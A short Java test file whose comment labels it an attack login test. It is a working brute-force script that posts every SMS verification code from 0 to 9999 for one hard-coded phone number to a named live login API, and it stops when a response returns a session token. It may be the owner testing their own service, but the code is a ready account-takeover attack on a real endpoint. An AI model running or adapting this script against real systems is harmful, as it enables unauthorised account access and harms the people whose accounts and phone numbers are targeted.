package test;

import org.apache.commons.collections.map.HashedMap;
import org.utils.HttpUtil;

import java.util.Map;

/**
 * Created by flysLi on 2017/9/12.
 */
public class Test1 {
    public static void main(String[] args) throws Exception {
        //攻击登陆测试
        String loginUri = "http://aliyun.88gongxiang.com:8000/api/v1/common/login";
        for (int i = 0; i < 10000; i++) {
            Map<String, Object> params = new HashedMap();
            params.put("mobile", "18914913629");
            params.put("code", i);
            String str = HttpUtil.post(loginUri, params);
            System.out.println("第 " + i + " 次");
            if (str.indexOf("token") > -1) {
                System.out.println(str);
                return;
            }
        }
    }
}
